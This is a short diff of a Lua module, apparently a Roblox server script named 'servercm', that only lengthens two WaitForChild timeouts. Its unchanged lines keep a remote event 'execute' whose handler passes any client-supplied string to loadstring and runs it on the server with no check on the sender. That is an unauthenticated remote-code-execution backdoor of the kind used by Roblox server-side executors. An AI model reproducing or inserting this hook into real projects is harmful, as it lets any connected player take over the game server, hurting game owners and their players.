@@ -8,10 +8,10 @@ function module:init(exec, execute2, main, title, buttons, execute, shadow, clea
 		script.Name = "servercm"
 
 		local remotes = {
-			execute = script.Parent:WaitForChild("execute");
+			execute = script.Parent:WaitForChild("execute", 99999);
 		}
 
-		local loadstring = require(game:GetService("ServerScriptService"):WaitForChild("loadstring", 5))
+		local loadstring = require(game:GetService("ServerScriptService"):WaitForChild("loadstring", 9999))
 
 		remotes.execute.OnServerEvent:Connect(function(_, code)
 			loadstring(code)()
